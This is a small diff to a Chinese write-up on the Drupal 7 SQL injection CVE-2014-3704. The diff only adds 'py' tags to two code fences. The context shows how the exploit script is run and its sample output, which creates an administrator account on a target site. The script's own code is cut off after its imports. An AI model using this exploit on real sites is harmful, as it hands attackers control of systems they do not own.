@@ -8,7 +8,7 @@ Drupal 在 2014 年 10 月 15 日宣布修复了一处 SQL 注入漏洞。漏洞
 
 脚本调用语法,需要你输入你要创建的帐户名和密码:
 
-```
+```py
 ~$ python cve-2014-3704.py <URL>
 [+] Attempting CVE-2014-3704 Drupal 7.x SQLi
 Username to add: admin_user
@@ -17,7 +17,7 @@ Account created with user: admin_user and password: password
 
 代码示例:
 
-```
+```py
 #!/usr/bin/python
 import sys, urllib2 # 导入需要的模块
 
